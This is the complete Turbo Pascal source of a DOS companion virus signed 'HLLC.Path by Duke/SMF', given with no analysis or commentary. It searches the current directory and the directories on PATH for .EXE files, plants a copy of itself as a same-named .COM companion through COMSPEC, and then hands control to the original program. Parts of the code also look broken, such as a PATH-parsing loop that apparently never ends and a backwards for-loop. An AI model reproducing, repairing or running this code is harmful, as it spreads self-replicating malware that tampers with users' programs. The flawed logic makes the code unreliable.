   {$M 3000, 0, 3000}
   program HLLC_Path;
   uses dos;
   var ds:dirstr;
       ns:namestr;
       es:extstr;
       fil,command:string;
       path:array[1..15] of string;
       KD:byte;
   {-----------------------------------------------------}
   procedure GetPath;
   var s:string;
       p:integer;
   begin
   s:=GetEnv('PATH');
   KD:=0;
   while s<>'' do
     begin
     p:=pos(';',s);
     KD:=KD+1;
     if p<>0 then
       begin
       path[KD]:=copy(s,1,p-1);
       s:=copy(s,p+1,length(s)-p);
       end
     else path[KD]:=s;
     end;
   end;
   {-----------------------------------------------------}
   procedure Infect(n,p,r:string);
   var a:dirstr;
       b:namestr;
       c:extstr;
       k:searchrec;
   begin
   fsplit(n,a,b,c);
   fil:=p+b+r;
   findfirst(fil,$3f,k);
   if doserror<>0 then exec(Command,'/c '+paramstr(0)+' '+fil+'>nul');
   end;
   {-----------------------------------------------------}
   procedure ScanDir(o,p,r:string);
   var d:searchrec;
   begin
   findfirst(o+'*.exe',$21,d);
   while doserror=0 do
     begin
     infect(d.name,p,r);
     findnext(d);
     end;
   end;
   {-----------------------------------------------------}
   procedure Common;
   var i,find:byte;
       n:searchrec;
       par:string;
   begin
   Command:='[HLLC.Path by Duke/SMF]';
   Command:=GetEnv('COMSPEC');
   GetPath;
   par:='';
   for i:=1 to paramcount do par:=' '+paramstr(i);
   fsplit(paramstr(0),ds,ns,es);
   if es='.COM' then
     begin
     fil:=ds+ns+'.EXE';
     findfirst(fil,$3f,n);
     if doserror=0 then exec(Command,'/c '+fil+par);
     end
   else
     begin
     find:=0;
     for i:=1 to KD do if ds=path[i] then find:=i;
     if find<>0 then
       begin
       fil:=path[find+1]+ns+es;
       findfirst(fil,$3f,n);
       if doserror=0 then exec(Command,'/c '+fil+par);
       end
     else for i:=KD to 2 do ScanDir(path[i]+'\',path[i-1]+'\','.EXE');
     end;
   ScanDir('','','.COM');
   end;
   {-----------------------------------------------------}
   begin
   Common;
   end.
